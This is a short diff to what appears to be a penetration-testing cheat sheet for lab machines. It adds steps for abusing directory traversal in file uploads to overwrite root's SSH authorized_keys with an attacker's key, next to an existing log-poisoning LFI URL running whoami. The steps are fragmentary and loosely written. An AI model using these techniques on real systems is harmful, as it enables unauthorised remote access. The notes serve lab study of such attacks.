@@ -261,9 +261,19 @@ http://10.10.10.xxx /menu.php?file=../../../../var/log/apache2/access.log&cmd=wh
 ## File Uploads
 
 * upload and find path to the file to execute it
-* if execution not possible then follow:
+* if execution not possible then try overwriting system files if directory traversal aso possible:
 
 ```bash
+
+# overwrite ssh keys
+
+# craft malicious key
+
+cat bad.pub > authorized_keys
+
+# overwrite auth keys with attackers pulic key
+
+http://10.10.10.xxx /menu.php?file=../../../../../root/.ssh/authorized_keys
 
 ```
 
